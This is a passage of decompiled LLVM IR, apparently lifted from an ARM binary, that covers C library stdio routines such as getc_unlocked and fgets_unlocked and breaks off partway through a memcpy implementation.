  uselistorder i32 %v3_1afb4, { 1, 2, 0 }
  uselistorder i32 %v0_1aea4, { 1, 0, 2 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 120) to i32*), { 1, 2, 0 }
  uselistorder i32 120, { 1, 3, 4, 5, 6, 0, 10, 9, 2, 7, 8 }
  uselistorder label %bb41, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1afb4, { 1, 0 }
  uselistorder label %bb39, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1af2c, { 1, 0 }
  uselistorder label %dec_label_pc_1ae60, { 1, 0 }
}

define i32 @function_1b010(i32 %arg1) local_unnamed_addr {
dec_label_pc_1b010:
  %v0_1b010 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1b010, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_1b010
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1b010, %bb
  %v5_1b02c = phi i32 [ %arg1, %dec_label_pc_1b010 ], [ 0, %bb ]
  ret i32 %v5_1b02c

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_1b030 = load i32, i32* @r4, align 4
  store i32 %v3_1b030, i32* %stack_var_-12, align 4
  %v6_1b030 = load i32, i32* @r5, align 4
  %v9_1b030 = load i32, i32* @lr, align 4
  %v0_1b034 = load i32, i32* @r0, align 4
  %v1_1b034 = add i32 %v0_1b034, 16
  %v2_1b034 = inttoptr i32 %v1_1b034 to i32*
  %v3_1b034 = load i32, i32* %v2_1b034, align 4
  store i32 %v3_1b034, i32* %r2.global-to-local, align 4
  %v1_1b038 = add i32 %v0_1b034, 24
  %v2_1b038 = inttoptr i32 %v1_1b038 to i32*
  %v3_1b038 = load i32, i32* %v2_1b038, align 4
  %v3_1b03c = icmp ult i32 %v3_1b034, %v3_1b038
  store i32 %v0_1b034, i32* @r4, align 4
  br i1 %v3_1b03c, label %bb, label %dec_label_pc_1b05c

bb:                                               ; preds = %entry
  %v2_1b048 = inttoptr i32 %v3_1b034 to i8*
  %v3_1b048 = load i8, i8* %v2_1b048, align 1
  %v4_1b048 = zext i8 %v3_1b048 to i32
  store i32 %v4_1b048, i32* %r0.global-to-local, align 4
  %v6_1b048 = add i32 %v3_1b034, 1
  store i32 %v6_1b048, i32* %r2.global-to-local, align 4
  store i32 %v6_1b048, i32* %v2_1b034, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b05c:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r5, align 4
  %v1_1b05c = inttoptr i32 %v0_1b034 to i16*
  %v2_1b05c = load i16, i16* %v1_1b05c, align 2
  %v3_1b05c = zext i16 %v2_1b05c to i32
  %v1_1b060 = and i32 %v3_1b05c, 131
  %tmp25 = icmp ugt i32 %v1_1b060, 128
  br i1 %tmp25, label %dec_label_pc_1b07c, label %dec_label_pc_1b06c

dec_label_pc_1b06c:                               ; preds = %dec_label_pc_1b05c
  store i32 128, i32* @r1, align 4
  %v0_1b070 = call i32 @__stdio_trans2r_o()
  store i32 %v0_1b070, i32* %r0.global-to-local, align 4
  %v2_1b074 = icmp eq i32 %v0_1b070, 0
  br i1 %v2_1b074, label %dec_label_pc_1b06c.dec_label_pc_1b07c_crit_edge, label %dec_label_pc_1b144

dec_label_pc_1b06c.dec_label_pc_1b07c_crit_edge:  ; preds = %dec_label_pc_1b06c
  %v0_1b07c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b07c

dec_label_pc_1b07c:                               ; preds = %dec_label_pc_1b06c.dec_label_pc_1b07c_crit_edge, %dec_label_pc_1b05c
  %v2_1b0bc = phi i32 [ %v0_1b07c.pre, %dec_label_pc_1b06c.dec_label_pc_1b07c_crit_edge ], [ %v0_1b034, %dec_label_pc_1b05c ]
  %v1_1b07c = inttoptr i32 %v2_1b0bc to i16*
  %v2_1b07c = load i16, i16* %v1_1b07c, align 2
  %v3_1b07c = zext i16 %v2_1b07c to i32
  store i32 %v3_1b07c, i32* %r2.global-to-local, align 4
  %v1_1b080 = and i32 %v3_1b07c, 2
  %v2_1b080 = icmp eq i32 %v1_1b080, 0
  br i1 %v2_1b080, label %dec_label_pc_1b0ac, label %dec_label_pc_1b088

dec_label_pc_1b088:                               ; preds = %dec_label_pc_1b07c
  %tmp26 = urem i16 %v2_1b07c, 2
  %v1_1b088 = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_1b088
  %v4_1b08c = and i32 %tmp22, 4
  %v5_1b08c = add i32 %v4_1b08c, %v2_1b0bc
  %v1_1b090 = add i32 %v5_1b08c, 36
  %v2_1b090 = inttoptr i32 %v1_1b090 to i8*
  %v3_1b090 = load i8, i8* %v2_1b090, align 1
  %v4_1b090 = zext i8 %v3_1b090 to i32
  %v1_1b094 = add nsw i32 %v3_1b07c, -1
  store i32 %v1_1b094, i32* %r2.global-to-local, align 4
  store i32 %v4_1b090, i32* %r0.global-to-local, align 4
  %v2_1b0a0 = add i32 %v2_1b0bc, 40
  %v3_1b0a0 = inttoptr i32 %v2_1b0a0 to i32*
  store i32 0, i32* %v3_1b0a0, align 4
  %v0_1b0a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b0a4 = trunc i32 %v0_1b0a4 to i16
  %v2_1b0a4 = load i32, i32* @r4, align 4
  %v3_1b0a4 = inttoptr i32 %v2_1b0a4 to i16*
  store i16 %v1_1b0a4, i16* %v3_1b0a4, align 2
  br label %dec_label_pc_1b148

dec_label_pc_1b0ac:                               ; preds = %dec_label_pc_1b07c
  %v1_1b0ac = add i32 %v2_1b0bc, 16
  %v1_1b0b0 = inttoptr i32 %v1_1b0ac to i32*
  %v2_1b0b0 = load i32, i32* %v1_1b0b0, align 4
  %v3_1b0b0 = add i32 %v2_1b0bc, 20
  %v4_1b0b0 = inttoptr i32 %v3_1b0b0 to i32*
  %v5_1b0b0 = load i32, i32* %v4_1b0b0, align 4
  %v9_1b0b4 = icmp eq i32 %v5_1b0b0, %v2_1b0b0
  br i1 %v9_1b0b4, label %dec_label_pc_1b0c4, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1b0ac
  %v2_1b0b8 = inttoptr i32 %v2_1b0b0 to i8*
  %v3_1b0b8 = load i8, i8* %v2_1b0b8, align 1
  %v4_1b0b8 = zext i8 %v3_1b0b8 to i32
  store i32 %v4_1b0b8, i32* %r0.global-to-local, align 4
  %v6_1b0b8 = add i32 %v2_1b0b0, 1
  store i32 %v6_1b0b8, i32* %v1_1b0b0, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b0c4:                               ; preds = %dec_label_pc_1b0ac
  %v1_1b0c4 = add i32 %v2_1b0bc, 4
  %v2_1b0c4 = inttoptr i32 %v1_1b0c4 to i32*
  %v3_1b0c4 = load i32, i32* %v2_1b0c4, align 4
  %v7_1b0c8 = icmp eq i32 %v3_1b0c4, -2
  br i1 %v7_1b0c8, label %.thread7, label %dec_label_pc_1b0dc

.thread7:                                         ; preds = %dec_label_pc_1b0c4
  %v2_1b0cc = or i16 %v2_1b07c, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_1b0cc, i16* %v1_1b07c, align 2
  br label %dec_label_pc_1b148

dec_label_pc_1b0dc:                               ; preds = %dec_label_pc_1b0c4
  %v1_1b0dc = and i32 %v3_1b07c, 768
  %v2_1b0dc = icmp eq i32 %v1_1b0dc, 0
  br i1 %v2_1b0dc, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_1b0dc
  %v1_1b0e4 = load i32, i32* @r5, align 4
  %v3_1b0e4 = add i32 %v1_1b0e4, 52
  %v4_1b0e4 = inttoptr i32 %v3_1b0e4 to i32*
  %v5_1b0e4 = load i32, i32* %v4_1b0e4, align 4
  store i32 %v5_1b0e4, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1b0dc, %bb23
  %v1_1b0e8 = xor i1 %v2_1b0dc, true
  call void @__pseudo_cond_branch(i1 %v1_1b0e8, i32 ptrtoint (i32* @global_var_1ae24.1563 to i32))
  %v0_1b0ec = load i32, i32* @r4, align 4
  %v1_1b0ec = add i32 %v0_1b0ec, 8
  store i32 %v1_1b0ec, i32* %r2.global-to-local, align 4
  %v1_1b0f0 = inttoptr i32 %v1_1b0ec to i32*
  %v2_1b0f0 = load i32, i32* %v1_1b0f0, align 4
  store i32 %v2_1b0f0, i32* %r2.global-to-local, align 4
  %v3_1b0f0 = add i32 %v0_1b0ec, 12
  %v4_1b0f0 = inttoptr i32 %v3_1b0f0 to i32*
  %v5_1b0f0 = load i32, i32* %v4_1b0f0, align 4
  %v9_1b0f4 = icmp eq i32 %v5_1b0f0, %v2_1b0f0
  br i1 %v9_1b0f4, label %dec_label_pc_1b128, label %dec_label_pc_1b0fc

dec_label_pc_1b0fc:                               ; preds = %.thread9
  %v2_1b0fc = add i32 %v0_1b0ec, 24
  %v3_1b0fc = inttoptr i32 %v2_1b0fc to i32*
  store i32 %v2_1b0f0, i32* %v3_1b0fc, align 4
  %v0_1b100 = load i32, i32* @r4, align 4
  store i32 %v0_1b100, i32* %r0.global-to-local, align 4
  %v2_1b104 = call i32 @__stdio_rfill(i32 %v0_1b100)
  store i32 %v2_1b104, i32* %r0.global-to-local, align 4
  %v2_1b108 = icmp eq i32 %v2_1b104, 0
  br i1 %v2_1b108, label %dec_label_pc_1b144, label %dec_label_pc_1b110

dec_label_pc_1b110:                               ; preds = %dec_label_pc_1b0fc
  %v0_1b110 = load i32, i32* @r4, align 4
  %v1_1b110 = add i32 %v0_1b110, 20
  %v2_1b110 = inttoptr i32 %v1_1b110 to i32*
  %v3_1b110 = load i32, i32* %v2_1b110, align 4
  %v2_1b114 = add i32 %v0_1b110, 24
  %v3_1b114 = inttoptr i32 %v2_1b114 to i32*
  store i32 %v3_1b110, i32* %v3_1b114, align 4
  %v0_1b118 = load i32, i32* @r4, align 4
  %v1_1b118 = add i32 %v0_1b118, 16
  %v2_1b118 = inttoptr i32 %v1_1b118 to i32*
  %v3_1b118 = load i32, i32* %v2_1b118, align 4
  %v1_1b11c = inttoptr i32 %v3_1b118 to i8*
  %v2_1b11c = load i8, i8* %v1_1b11c, align 1
  %v3_1b11c = zext i8 %v2_1b11c to i32
  store i32 %v3_1b11c, i32* %r0.global-to-local, align 4
  %v5_1b11c = add i32 %v3_1b118, 1
  store i32 %v5_1b11c, i32* %v2_1b118, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b128:                               ; preds = %.thread9
  %v1_1b128 = inttoptr i32 %v0_1b0ec to i16*
  store i32 %v0_1b0ec, i32* %r0.global-to-local, align 4
  %v2_1b12c = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1b134 = call i32 @__stdio_READ(i16* %v1_1b128, i32 %v2_1b12c, i32 1)
  store i32 %v5_1b134, i32* %r0.global-to-local, align 4
  %v2_1b138 = icmp eq i32 %v5_1b134, 0
  br i1 %v2_1b138, label %dec_label_pc_1b144, label %bb24

bb24:                                             ; preds = %dec_label_pc_1b128
  %v4_1b13c = load i8, i8* %stack_var_-17, align 1
  %v5_1b13c = sext i8 %v4_1b13c to i32
  store i32 %v5_1b13c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b144:                               ; preds = %dec_label_pc_1b128, %dec_label_pc_1b06c, %dec_label_pc_1b0fc
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1b148

dec_label_pc_1b148:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_1b110, %dec_label_pc_1b088, %dec_label_pc_1b144
  %v2_1b14c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1b14c, i32* @r4, align 4
  store i32 %v6_1b030, i32* @r5, align 4
  store i32 %v9_1b030, i32* @lr, align 4
  %v1_1b150 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1b150

; uselistorder directives
  uselistorder i32 %v2_1b0b0, { 1, 0, 2 }
  uselistorder i32 %v2_1b0bc, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_1b034, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_1b148, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_1b144, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_1b15c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b160 = icmp eq i32 %arg2, 0
  store i1 %v2_1b160, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1b1e8, label %dec_label_pc_1b1d0.preheader

dec_label_pc_1b1d0.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_1b1d02 = add i32 %arg2, -1
  store i32 %v1_1b1d02, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_1b1d08 = icmp eq i32 %arg2, 1
  store i1 %v7_1b1d08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b1d08, label %dec_label_pc_1b1d8, label %dec_label_pc_1b17c

dec_label_pc_1b17c:                               ; preds = %dec_label_pc_1b1d0.preheader, %dec_label_pc_1b1d0.backedge.dec_label_pc_1b17c_crit_edge
  %v0_1b1a0 = phi i32 [ %v0_1b17c.pre, %dec_label_pc_1b1d0.backedge.dec_label_pc_1b17c_crit_edge ], [ %arg3, %dec_label_pc_1b1d0.preheader ]
  %v1_1b17c = add i32 %v0_1b1a0, 16
  %v2_1b17c = inttoptr i32 %v1_1b17c to i32*
  %v3_1b17c = load i32, i32* %v2_1b17c, align 4
  store i32 %v3_1b17c, i32* %r2.global-to-local, align 4
  %v1_1b180 = add i32 %v0_1b1a0, 24
  %v2_1b180 = inttoptr i32 %v1_1b180 to i32*
  %v3_1b180 = load i32, i32* %v2_1b180, align 4
  store i32 %v3_1b180, i32* %r3.global-to-local, align 4
  %v3_1b184 = icmp uge i32 %v3_1b17c, %v3_1b180
  store i1 %v3_1b184, i1* %cpsr_c.global-to-local, align 1
  %v9_1b184 = icmp eq i32 %v3_1b17c, %v3_1b180
  store i1 %v9_1b184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1b184, label %dec_label_pc_1b1a0, label %dec_label_pc_1b18c

dec_label_pc_1b18c:                               ; preds = %dec_label_pc_1b17c
  %v1_1b18c = inttoptr i32 %v3_1b17c to i8*
  %v2_1b18c = load i8, i8* %v1_1b18c, align 1
  %v3_1b18c = zext i8 %v2_1b18c to i32
  store i32 %v3_1b18c, i32* %r3.global-to-local, align 4
  %v5_1b18c = add i32 %v3_1b17c, 1
  store i32 %v5_1b18c, i32* %r2.global-to-local, align 4
  %v2_1b190 = load i32, i32* @r5, align 4
  %v3_1b190 = inttoptr i32 %v2_1b190 to i8*
  store i8 %v2_1b18c, i8* %v3_1b190, align 1
  %v4_1b190 = load i32, i32* @r5, align 4
  %v5_1b190 = add i32 %v4_1b190, 1
  store i32 %v5_1b190, i32* @r5, align 4
  %v0_1b194 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b194 = icmp ugt i32 %v0_1b194, 9
  store i1 %v2_1b194, i1* %cpsr_c.global-to-local, align 1
  %v7_1b194 = icmp eq i32 %v0_1b194, 10
  store i1 %v7_1b194, i1* %cpsr_z.global-to-local, align 1
  %v0_1b198 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b198 = load i32, i32* @r4, align 4
  %v2_1b198 = add i32 %v1_1b198, 16
  %v3_1b198 = inttoptr i32 %v2_1b198 to i32*
  store i32 %v0_1b198, i32* %v3_1b198, align 4
  br i1 %v7_1b194, label %dec_label_pc_1b1d8, label %dec_label_pc_1b1d0.backedge

dec_label_pc_1b1a0:                               ; preds = %dec_label_pc_1b17c
  %v1_1b1a0 = inttoptr i32 %v0_1b1a0 to i16*
  %v3_1b1a4 = call i32 @getc_unlocked(i16* %v1_1b1a0)
  %v3_1b1a8 = icmp eq i32 %v3_1b1a4, -1
  store i1 %v3_1b1a8, i1* %cpsr_c.global-to-local, align 1
  %v8_1b1a8 = icmp eq i32 %v3_1b1a4, -1
  store i1 %v8_1b1a8, i1* %cpsr_z.global-to-local, align 1
  %v1_1b1ac = urem i32 %v3_1b1a4, 256
  store i32 %v1_1b1ac, i32* %r3.global-to-local, align 4
  br i1 %v3_1b1a8, label %dec_label_pc_1b1b4, label %dec_label_pc_1b1cc

dec_label_pc_1b1b4:                               ; preds = %dec_label_pc_1b1a0
  %v0_1b1b4 = load i32, i32* @r4, align 4
  %v1_1b1b4 = inttoptr i32 %v0_1b1b4 to i16*
  %v2_1b1b4 = load i16, i16* %v1_1b1b4, align 2
  %v3_1b1b4 = zext i16 %v2_1b1b4 to i32
  store i32 %v3_1b1b4, i32* %r3.global-to-local, align 4
  %v1_1b1b8 = and i32 %v3_1b1b4, 8
  %v2_1b1b8 = icmp eq i32 %v1_1b1b8, 0
  store i1 %v2_1b1b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b1b8, label %dec_label_pc_1b1d8, label %dec_label_pc_1b1e8

dec_label_pc_1b1cc:                               ; preds = %dec_label_pc_1b1a0
  %v1_1b1c4 = trunc i32 %v3_1b1a4 to i8
  %v2_1b1c4 = load i32, i32* @r5, align 4
  %v3_1b1c4 = inttoptr i32 %v2_1b1c4 to i8*
  store i8 %v1_1b1c4, i8* %v3_1b1c4, align 1
  %v4_1b1c4 = load i32, i32* @r5, align 4
  %v5_1b1c4 = add i32 %v4_1b1c4, 1
  store i32 %v5_1b1c4, i32* @r5, align 4
  %v0_1b1c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1b1c8 = icmp ugt i32 %v0_1b1c8, 9
  store i1 %v2_1b1c8, i1* %cpsr_c.global-to-local, align 1
  %v7_1b1c8 = icmp eq i32 %v0_1b1c8, 10
  store i1 %v7_1b1c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b1c8, label %dec_label_pc_1b1d8, label %dec_label_pc_1b1d0.backedge

dec_label_pc_1b1d0.backedge:                      ; preds = %dec_label_pc_1b1cc, %dec_label_pc_1b18c
  %v0_1b1d0 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b1d0 = add i32 %v0_1b1d0, -1
  store i32 %v1_1b1d0, i32* %r6.global-to-local, align 4
  %v2_1b1d0 = icmp ne i32 %v0_1b1d0, 0
  store i1 %v2_1b1d0, i1* %cpsr_c.global-to-local, align 1
  %v7_1b1d0 = icmp eq i32 %v0_1b1d0, 1
  store i1 %v7_1b1d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b1d0, label %dec_label_pc_1b1d8, label %dec_label_pc_1b1d0.backedge.dec_label_pc_1b17c_crit_edge

dec_label_pc_1b1d0.backedge.dec_label_pc_1b17c_crit_edge: ; preds = %dec_label_pc_1b1d0.backedge
  %v0_1b17c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1b17c

dec_label_pc_1b1d8:                               ; preds = %dec_label_pc_1b1cc, %dec_label_pc_1b1d0.backedge, %dec_label_pc_1b18c, %dec_label_pc_1b1d0.preheader, %dec_label_pc_1b1b4
  %v0_1b1d8 = load i32, i32* @r5, align 4
  %v1_1b1d8 = load i32, i32* @r7, align 4
  %v3_1b1d8 = icmp uge i32 %v0_1b1d8, %v1_1b1d8
  store i1 %v3_1b1d8, i1* %cpsr_c.global-to-local, align 1
  %v9_1b1d8 = icmp eq i32 %v0_1b1d8, %v1_1b1d8
  store i1 %v9_1b1d8, i1* %cpsr_z.global-to-local, align 1
  %v2_1b1dc = xor i1 %v9_1b1d8, true
  %v3_1b1dc = and i1 %v3_1b1d8, %v2_1b1dc
  br i1 %v3_1b1dc, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1b1d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_1b1e0 = inttoptr i32 %v0_1b1d8 to i8*
  store i8 0, i8* %v7_1b1e0, align 1
  %v0_1b1e4.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_1b1e4.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1b1d8, %bb
  %v1_1b1e4 = phi i1 [ %v1_1b1e4.pre, %bb ], [ %v9_1b1d8, %dec_label_pc_1b1d8 ]
  %v0_1b1e4 = phi i1 [ %v0_1b1e4.pre, %bb ], [ %v3_1b1d8, %dec_label_pc_1b1d8 ]
  %v2_1b1e4 = xor i1 %v1_1b1e4, true
  %v3_1b1e4 = and i1 %v0_1b1e4, %v2_1b1e4
  br i1 %v3_1b1e4, label %.dec_label_pc_1b1ec_crit_edge, label %dec_label_pc_1b1e8

.dec_label_pc_1b1ec_crit_edge:                    ; preds = %.thread14
  %v0_1b1ec.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1b1ec

dec_label_pc_1b1e8:                               ; preds = %entry, %dec_label_pc_1b1b4, %.thread14
  br label %dec_label_pc_1b1ec

dec_label_pc_1b1ec:                               ; preds = %.dec_label_pc_1b1ec_crit_edge, %dec_label_pc_1b1e8
  %v0_1b1ec = phi i32 [ %v0_1b1ec.pre, %.dec_label_pc_1b1ec_crit_edge ], [ 0, %dec_label_pc_1b1e8 ]
  store i32 %v6_1b15c, i32* @r5, align 4
  ret i32 %v0_1b1ec

; uselistorder directives
  uselistorder i1 %v9_1b1d8, { 1, 0, 2 }
  uselistorder i32 %v1_1b1d8, { 1, 0 }
  uselistorder i32 %v0_1b1d8, { 0, 2, 1 }
  uselistorder i32 %v0_1b1d0, { 2, 0, 1 }
  uselistorder i32 %v0_1b1c8, { 1, 0 }
  uselistorder i32 %v3_1b1a4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1b194, { 1, 0 }
  uselistorder i32 %v3_1b17c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1b1a0, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 (i16*)* @getc_unlocked, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1b1ec, { 1, 0 }
  uselistorder label %dec_label_pc_1b1e8, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1b1d8, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1b17c, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_1b200 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b200 = load i32, i32* %r0.global-to-local, align 4
  %v2_1b200 = sub i32 %v0_1b200, %v1_1b200
  %v3_1b200 = icmp ult i32 %v0_1b200, %v1_1b200
  %v4_1b200 = xor i32 %v1_1b200, %v0_1b200
  %v5_1b200 = xor i32 %v2_1b200, %v0_1b200
  %v6_1b200 = and i32 %v5_1b200, %v4_1b200
  %v7_1b200 = icmp slt i32 %v6_1b200, 0
  store i1 %v7_1b200, i1* %cpsr_v.global-to-local, align 1
  %v8_1b200 = icmp slt i32 %v2_1b200, 0
  store i1 %v8_1b200, i1* %cpsr_n.global-to-local, align 1
  %v9_1b200 = icmp eq i32 %v0_1b200, %v1_1b200
  store i1 %v9_1b200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1b200, label %dec_label_pc_1b454, label %dec_label_pc_1b208

dec_label_pc_1b208:                               ; preds = %entry
  br i1 %v9_1b200, label %.thread129, label %bb

.thread129:                                       ; preds = %bb153, %.thread128, %bb150, %dec_label_pc_1b208
  %merge = phi i32 [ %v0_1b200, %dec_label_pc_1b208 ], [ %v2_1b4e8, %bb150 ], [ %v11_1b504, %bb153 ], [ %v7_1b504, %.thread128 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_1b208
  %v5_1b20c = inttoptr i32 %v1_1b200 to i8*
  store i8* %v5_1b20c, i8** %stack_var_-8, align 4
  %v8_1b20c = load i32, i32* @lr, align 4
  %v0_1b210 = load i32, i32* @r2, align 4
  %v2_1b210 = add i32 %v0_1b210, -4
  store i32 %v2_1b210, i32* %r2.global-to-local, align 4
  %v4_1b210 = sub i32 3, %v0_1b210
  %v5_1b210 = and i32 %v4_1b210, %v0_1b210
  %v6_1b210 = icmp slt i32 %v5_1b210, 0
  store i1 %v6_1b210, i1* %cpsr_v.global-to-local, align 1
  %v7_1b210 = icmp slt i32 %v2_1b210, 0
  store i1 %v7_1b210, i1* %cpsr_n.global-to-local, align 1
  %v8_1b210 = icmp eq i32 %v0_1b210, 4
  store i1 %v8_1b210, i1* %cpsr_z.global-to-local, align 1
  %v5_1b214 = icmp slt i32 %v0_1b210, 4
  br i1 %v5_1b214, label %bb140, label %dec_label_pc_1b218

dec_label_pc_1b218:                               ; preds = %bb
  %v1_1b218 = urem i32 %v1_1b200, 4
  store i32 %v1_1b218, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b218 = icmp eq i32 %v1_1b218, 0
  store i1 %v2_1b218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b218, label %dec_label_pc_1b220, label %dec_label_pc_1b2cc

dec_label_pc_1b220:                               ; preds = %dec_label_pc_1b218
  %v1_1b220 = urem i32 %v0_1b200, 4
  store i32 %v1_1b220, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b220 = icmp eq i32 %v1_1b220, 0
  store i1 %v2_1b220, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_1b200 to i2
  br i1 %v2_1b220, label %dec_label_pc_1b228, label %dec_label_pc_1b2fc

dec_label_pc_1b228:                               ; preds = %dec_label_pc_1b220, %dec_label_pc_1b2f4
  %v0_1b24093 = phi i32 [ %v1_1b200, %dec_label_pc_1b220 ], [ %v0_1b41c76, %dec_label_pc_1b2f4 ]
  %v0_1b23c92 = phi i32 [ %v0_1b200, %dec_label_pc_1b220 ], [ %v0_1b2f4, %dec_label_pc_1b2f4 ]
  %v0_1b228 = phi i32 [ %v2_1b210, %dec_label_pc_1b220 ], [ %v2_1b2ec, %dec_label_pc_1b2f4 ]
  %v1_1b228 = add i32 %v0_1b228, -8
  store i32 %v1_1b228, i32* %r2.global-to-local, align 4
  %v3_1b228 = sub i32 7, %v0_1b228
  %v4_1b228 = and i32 %v3_1b228, %v0_1b228
  %v5_1b228 = icmp slt i32 %v4_1b228, 0
  store i1 %v5_1b228, i1* %cpsr_v.global-to-local, align 1
  %v6_1b228 = icmp slt i32 %v1_1b228, 0
  store i1 %v6_1b228, i1* %cpsr_n.global-to-local, align 1
  %v7_1b228 = icmp eq i32 %v0_1b228, 8
  store i1 %v7_1b228, i1* %cpsr_z.global-to-local, align 1
  %v2_1b22c = xor i1 %v6_1b228, %v5_1b228
  br i1 %v2_1b22c, label %dec_label_pc_1b27c, label %dec_label_pc_1b230

dec_label_pc_1b230:                               ; preds = %dec_label_pc_1b228
  %v1_1b230 = add i32 %v0_1b228, -28
  store i32 %v1_1b230, i32* %r2.global-to-local, align 4
  %v3_1b230 = sub i32 27, %v0_1b228
  %v4_1b230 = and i32 %v3_1b230, %v1_1b228
  %v5_1b230 = icmp slt i32 %v4_1b230, 0
  store i1 %v5_1b230, i1* %cpsr_v.global-to-local, align 1
